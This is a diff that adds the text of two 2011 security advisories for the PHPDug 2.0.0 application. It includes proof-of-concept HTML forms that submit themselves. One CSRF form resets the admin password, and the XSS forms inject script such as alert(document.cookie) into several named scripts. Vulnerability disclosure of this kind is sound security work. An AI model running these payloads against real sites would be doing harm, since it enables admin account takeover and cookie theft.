@@ -1,0 +1,90 @@
+Vulnerability ID: HTB22971
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_phpdug.html
+Product: PHPDug
+Vendor: Kubelabs.com ( http://www.kubelabs.com/ )
+Vulnerable Version: 2.0.0 and probably prior versions
+Vendor Notification: 21 April 2011
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Risk level: Low
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ )
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "adm/admin_edit.php" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/adm/admin_edit.php" method="post" name="main">
+<input type="hidden" name="id[1]" value="USERID">
+<input type="hidden" name="username[USERID]" value="Admin">
+<input type="hidden" name="password[USERID]" value="test123">
+<input type="hidden" name="Submit" value="Submit">
+</form>
+<script>
+document.main.submit();
+</script>
+
+Vulnerability ID: HTB22970
+Reference: http://www.htbridge.ch/advisory/multiple_xss_vulnerabilities_in_phpdug.h
+tml
+Product: PHPDug
+Vendor: Kubelabs.com ( http://www.kubelabs.com/ )
+Vulnerable Version: 2.0.0 and probably prior versions
+Vendor Notification: 21 April 2011
+Vulnerability Type: XSS (Cross Site Scripting)
+Risk level: Medium
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ )
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "add_story.php", "editprofile.php", "adm/content_add.php", "adm/admin_edit.php" scripts to properly sanitize user-supplied input in "story_url", "email", "title", "username" variables. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+1.
+
+<form action="http://host/add_story.php" method="post" name="main">
+<input type="hidden" name="story_url" value='http://www.example.com/"><script>alert(document.cookie)</script>'
+>
+<input type="hidden" name="Submit" value="Continue">
+</form>
+<script>
+document.main.submit();
+</script>
+
+2.
+
+<form action="http://host/editprofile.php" method="post" name="main">
+<input type="hidden" name="email" value='email (at) example (dot) com [email concealed]"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="commentst" value="-4">
+<input type="hidden" name="Submit" value="Save Changes">
+</form>
+<script>
+document.main.submit();
+</script>
+
+3.
+
+<form action="http://host/adm/content_add.php" method="post" name="main">
+<input type="hidden" name="id" value="999">
+<input type="hidden" name="title" value='page"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="contentvalue="content">
+<input type="hidden" name="Submit" value="Submit">
+</form>
+<script>
+document.main.submit();
+</script>
+
+4.
+
+<form action="http://host/adm/admin_edit.php" method="post" name="main">
+<input type="hidden" name="id[1]" value="1">
+<input type="hidden" name="username[1]" value='admin<script>alert("XSS")</script>'>
+<input type="hidden" name="password[1]" value="">
+<input type="hidden" name="Submit" value="Submit">
+</form>
+<script>
+document.main.submit();
+</script>
